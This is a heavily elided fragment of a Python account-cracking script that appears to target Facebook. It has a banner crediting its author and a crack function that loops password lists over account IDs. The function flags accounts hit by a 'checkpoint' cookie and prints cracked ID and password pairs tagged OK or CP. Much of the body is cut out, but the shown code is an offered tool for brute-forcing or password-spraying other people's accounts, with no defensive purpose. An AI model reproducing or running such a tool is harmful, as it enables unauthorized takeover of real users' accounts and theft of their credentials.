...
\033[1;37m----------------------------------------------
 AUTHOR     : SURAJ BHUSAL
 GITHUB     : 𝗦 𝗘 𝗖 𝗥 𝗘 𝗧
 FACEBOOK   : SURAJ BHUSAL
 DECODE BY  : S U R A J   D O N N  A
\033[1;37m----𝗩𝗔𝗚𝗬𝗔 𝗥𝗔𝗠𝗥𝗢 𝗥𝗔𝗜𝗫𝗔 SURAJ 𝗞𝗢 𝗖𝗠𝗗 𝗨𝗦𝗘 𝗚𝗔𝗥𝗡𝗔 𝗣𝗔𝗜𝗦-""")
def banner():
	print(logo)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[SURAJ-EXE]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{P}{K} [SURAJ-CP] {idf} │ {pw} {P}')
				...
				print(f'\r{P}{H} [SURAJ-OK] {idf} │ {pw} {P}')
